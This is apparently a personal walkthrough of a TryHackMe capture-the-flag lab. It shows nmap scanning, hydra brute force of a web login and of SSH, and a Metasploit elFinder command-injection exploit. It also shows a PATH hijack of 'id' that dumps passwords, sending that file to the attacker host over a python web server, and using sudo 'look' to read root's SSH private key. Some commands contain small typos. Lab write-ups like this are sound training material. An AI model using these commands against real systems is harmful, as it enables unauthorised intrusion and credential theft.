
2025-12-13 12:24 
Link: https://tryhackme.com/room/lookup
Tags: [[Writeups]]

## **IMPORTANT**:
**Always add the IP's and hostnames to _/etc/hosts**


# Discovery and user enumeration
Start by using **NMAP** to see open ports: ``nmap -u hostname -T4 -sC -sV``

22 and 80 were open, so SSH and HTTP are possible attack vectors

While verifying port 80, I've found a php login.
I've ran a user enumeration python script to find possible usernames.

```time python3 ./userenum.py /usr/share/wordlists/seclists/usernames/names/names.txt```

Found the user: _jose_


# Brute force and exploitation
Brute force the login using hydra

```hydra -l jose -P rockyou.txt -f lookup.thm http-form-post "/login.php:username=^USER^&password=^PASS^:Wrong"```

After the successful login, we're redirected to _files.lookup.thm_, add that to _/etc/hosts_. This URL reveals a elFinder page, after searching **msfconsole** for elFinder, we find this exploit: `exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection` that can be used to open a meterpreter session on the target machine. 

```
msf6> set rhosts files.lookup.thm
msf6> set lhosts localhost
msf6> exploit
```

Once we get a meterpreter session we can see that there's a user called *think* by checking the home folder, and on that folder we see the user.txt flag, that can't be read yet since our user does not have the required permissions and we need to vertically escalate our privileges.
However one of the first steps that we should take is stabilize the terminal.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
# Privilege escalation

First we check for misconfigurations

```find / -perm /4000 2>/dev/null```

This does not reveal the binary we were looking for in order to get root access, however there is one suspicious executable file ```/usr/sbin/pwm```. This file tries to read /home/www-data/.passwords, however this file is using the id command to get the username, and we can try to use that to our advantage.

```strace -e trace=process /usr/sbin/pwm```

This revealed that there are no path to id, this indicates that the command is being called relativly, this means that the location of the command is checked from the PATH environment. 

We can create our own script on _/tmp/id_ and add that to PATH.

```
echo '#!/bin/bash` > /tmp/id
echo "echo 'uid=33(think) gid=33(think) groups=33(think)'" >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
```

Then I moved to /tmp and ran the executable. Not very realistic, but I got a wordlist to brute force. I saved the output of the command to a file, and started a python http server in order to save that file to my local machine, and brute force my way in
```
/usr/sbin/pwm > passwords
python3 -m http.server 9090

wget http://lookup.thm:9090/passwords
hydra -l think -P ./passwords -f lookup.thm ssh
```

I was able to get a valid password, so I made a lateral movement to the think user, and got the SSH private key.

```
sudo /usr/bin/look '' "/root/.ssh/id_rsa"
```
With the keys saved in our local machine we can remotely create an SSH session.

```
chmod 600 ./id_rsa
ssh root@lookup.thm -i ./id_rsa
```

Now we have root privileges on the target machine. The only step left is to get and submit the flags.

## References
https://faetu.github.io/posts/lookup/
